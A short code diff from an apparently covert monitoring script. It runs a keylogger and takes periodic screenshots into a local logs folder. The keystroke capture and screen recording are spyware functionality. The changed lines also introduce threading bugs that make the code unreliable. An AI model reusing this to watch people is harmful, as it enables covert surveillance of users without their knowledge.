@@ -26,14 +26,16 @@ class Monitor:
 
     def _screenshot(self):
         sct = mss()
-        sct.shot(output='./logs/screenshots/{}.png'
-                 .format(time.time()))
+        sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))
+        sct.save()
 
     def run(self, interval = 1):
 
         self._build_logs()
+
+        Thread(target=self._screenshot()).start()
         Thread(target=self._keylogger()).start()
-        IntervalTimer(interval, self._screenshot).start()
+        IntervalTimer(interval, self._screenshot()).start()
 
 if __name__ == '__main__':
     mon = Monitor()
